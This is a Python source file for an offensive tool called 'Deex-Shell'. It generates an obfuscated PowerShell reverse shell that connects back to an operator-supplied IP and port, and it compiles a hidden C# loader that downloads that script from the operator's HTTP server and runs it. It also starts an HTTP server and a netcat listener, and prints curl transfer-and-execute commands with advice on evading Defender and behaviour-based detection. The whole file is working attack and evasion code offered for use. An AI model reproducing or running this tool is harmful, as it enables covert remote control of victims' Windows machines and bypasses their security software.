import os
import socket
import sys
import re
import string
import random
import subprocess
import threading
import time
import signal
import readline

readline.parse_and_bind('"\x1b[A": previous-history')  # Up arrow
readline.parse_and_bind('"\x1b[B": next-history')      # Down arrow
readline.parse_and_bind('"\x1b[C": forward-char')     # Right arrow
readline.parse_and_bind('"\x1b[D": backward-char')    # Left arrow

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    OKRED = '\033[91m'
    OKYELLOW = '\033[93m'
    ENDC = '\033[0m'

# Accept user input for IP and port
def create_pshell():
        ip = input("Enter IP address: ")
        port = input("Enter port: ")
        script = "cd;cd;dir;ls;cd;cd;cd;ping localhost > out;dir > out;sleep 10;Start-Process $PSHOME\\\\poWERshELl.exe -ArgumentList {-ep bypass -nop $client = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '< > ' + (pwd).Path + ' ' + '## ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden"

        # Replace all variables with random 10-character names - excluding $PSHOME
        var_dict = {}
        pattern = re.compile(r'(?!\$PSHOME)(\$[A-Za-z0-9]+)')

        def replace_var(match):
                var_name = match.group(1)
                if var_name not in var_dict:
                        var_dict[var_name] = f'${"".join(random.choices(string.ascii_letters + string.digits, k=10))}'
                return var_dict[var_name]

        script = pattern.sub(replace_var, script)

        # Replace iex with i''ex
        iex_match = re.compile(r'iex')
        def replace_invoke(match):
                iex_rand = ["i`e`x", "i`e''x", "i''e`x", "i''e''x", "i''e'\"\"'x"]
                iex_rep = random.choice(iex_rand)
                chars = ['i', 'e', 'x']
                random_char = random.choice(chars)
                iex_rep = iex_rep.replace(random_char, random_char.upper(), 1)
                return iex_rep

        script = iex_match.sub(replace_invoke, script)

        # Replace IP and port in script
        script = script.replace("'*LHOST*',*LPORT*", f"'{ip}',{port}")

        # Convert IP addresses to hex
        pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')

        def ip_to_hex(match):
                return '0x' + ''.join(f'{int(x):02x}' for x in match.group(0).split('.'))

        script = pattern.sub(ip_to_hex, script)

        # Convert Port Number to hex - Not matching 65535
        pattern = re.compile(r'\b(?!65535)([1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5])\b')

        def port_to_hex(match):
                port_number = int(match.group())
                hex_value = hex(port_number)
                return hex_value

        script = pattern.sub(port_to_hex, script)
        return script, ip, port

def cs_update(script, ip, port):
        # CSharp Code to Call PowerShell and Run Obfuscated Script
        c_sharpCode = """
        using System;
        using System.Diagnostics;
        using System.Threading;

        class {1}
        {{
        static void Main()
        {{
                try
                {{

                var {2} = "http://{0}/{3}";

                var {4} = new System.Net.WebClient().DownloadString({2});

                var {6} = new ProcessStartInfo

                {{
                        FileName = "poWErsheLL",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        RedirectStandardInput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                }};

                var {5} = new Process
                {{
                        StartInfo = {6},
                        EnableRaisingEvents = true
                }};
                Random {9} = new Random();
                int {10} = {9}.Next(1000, 5000);
                Thread.Sleep({10});
                {5}.Start();
                {5}.StandardInput.WriteLine({4});
                {5}.StandardInput.WriteLine("echo {7};exIt;eXit;{1}{9}{2}{10}{3}{1}{2}");
                {5}.Close();
                }}
                catch (Exception)
                {{
                //{7}{6}{5}
                }}
        }}
        }}
        """
        # random_values

        def random_val(length):
                return "".join(random.choices(string.ascii_letters, k=length))


        var1 = random_val(10)
        var2 = random_val(10)
        var3 = random_val(10)
        var4 = random_val(10)
        var5 = random_val(10)
        var6 = random_val(10)
        var7 = random_val(10)
        var8 = random_val(10)
        var9 = random_val(10)
        var10 = random_val(10)
        script_update = c_sharpCode.format(ip,var1,var2,var3,var4,var5,var6,var7,var8,var9,var10)

        var_file = "".join(random.choices(string.ascii_letters, k=10))
        # Add Random Values to variables
        new_fileName = var_file
        #print(ip, port, script)
        # Write Power.ps1
        with open(var3, "w") as power:
                        power.write(script)

        with open(new_fileName, "w") as out_file:
                        out_file.write(script_update)

        # Compile with mono
        compiler = "mcs"
        source_file = new_fileName
        subprocess.run([compiler, source_file], check=True)
        print(f"{Colors.OKGREEN}[+]{Colors.OKYELLOW} PE has been saved as {Colors.OKGREEN}{source_file}.exe{Colors.OKYELLOW} and Remote PowerShell Reverse Shell Script has been saved as{Colors.OKGREEN} {var3}{Colors.ENDC}{Colors.OKYELLOW} in the current directory{Colors.ENDC}")
        return var3, source_file

def run_http():
        http_serv = "python3 -m http.server 80 > /dev/null 2>&1"
        subprocess.run(http_serv, shell=True)

def run_netcat(ip, source_file, port):
        print(f"\n[-----+++++-----]\n\nWindows Commands To Transfer File:\n\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -o myapp.g (cmd will execute any file regardless of the extension as long as it is an executable, which it is) {Colors.ENDC}\n\nTransfer and Execute (Behaviour Detections Will Likely Flag This As Malicious)")
        time.sleep(1)
        print(f"\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -o {source_file}.g && {source_file}.g{Colors.ENDC}\n\nTransfer and Execute w/ Random Commands (Can Sometimes Bypass Behaviour Based Detection)\n\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -o myapp.g && ping -n 5 127.0.0.1 > nul && dir > nul && myapp.g{Colors.ENDC}\n\n[-----+++++-----]")
        print("\nIf Defender is blocking this - change line 117 in the code \"{5}.StandardInput.WriteLine(\"exit;{1}{9}{2}{10}{3}{1}{2}\")")
        print(f"\n\n{Colors.OKYELLOW}Running nc -lvnp {port}{Colors.ENDC}")
        netcat_command = f"nc -lvnp {port}"
        subprocess.run(netcat_command, shell=True)

def signal_handler(signal, frame):
    print('\n\nYou pressed Ctrl+C!')
    sys.exit()

signal.signal(signal.SIGINT, signal_handler)

def which_mcs():
        mcs_name = "mcs"
        try:
                subprocess.check_output(["which", mcs_name])
                #continue
        except subprocess.CalledProcessError:
                print(f"[!!!!!!] mono not installed, please install {Colors.OKRED}mono-mcs{Colors.ENDC} and {Colors.OKRED}mono-devel{Colors.ENDC}")
                sys.exit(0)

def prompt():
        print(f"\n|------ {Colors.OKYELLOW}Deex-Shell{Colors.ENDC} ------|\n")
        time.sleep(1)
        print("Loading Menu.....\n")
        time.sleep(1)
        while True:
                print(f"[{Colors.OKGREEN}+{Colors.ENDC}] Enter 1 to Create PE and start Listeners")
                time.sleep(0.5)
                print(f"[{Colors.OKGREEN}+{Colors.ENDC}] Enter 2 to simply create a PE")
                time.sleep(0.5)
                print(f"[{Colors.OKGREEN}+{Colors.ENDC}] Enter 3 to simply create a Obfuscated PowerShell Reverse Shell One Liner\n\n")
                time.sleep(0.5)
                next_step = input("<--Deex--># : ")
                if next_step == "1":
                        which_mcs()
                        script, ip, port = create_pshell()
                        var3, source_file = cs_update(script, ip, port)
                        http_thread = threading.Thread(target=run_http)
                        netcat_thread = threading.Thread(target=run_netcat, args=(ip, source_file, port,))
                        time.sleep(1)
                        print(f"{Colors.OKGREEN}[+]{Colors.OKYELLOW} Listener and HTTP Server will now start{Colors.ENDC}")
                        time.sleep(1)
                        print(f"{Colors.OKGREEN}[+]{Colors.OKYELLOW} HTTP Server Started on Port 80 - Serving File: {var3} (PowerShell Obfuscated Reverse Shell) and {source_file}.exe{Colors.ENDC} ")
                        # Start both threads
                        http_thread.start()
                        netcat_thread.start()
                        netcat_thread.join()
                        print("Exiting......\n")
                        time.sleep(2)
                elif next_step == "2":
                        which_mcs()
                        script, ip, port = create_pshell()
                        cs_update(script, ip, port)
                        print("Returning to Main Menu....\n")
                        time.sleep(1)
                elif next_step == "3":
                        pshell = create_pshell()
                        print_script = pshell[0]
                        print(f"\n{Colors.OKGREEN}[+] Obfuscated PowerShell Reverse Shell OneLiner{Colors.ENDC}\n")
                        print(print_script)
                        print("\n\n")
                else:
                        print("Please Type 1, 2 or 3\n")
                        time.sleep(1)

if __name__ == "__main__":
    prompt()
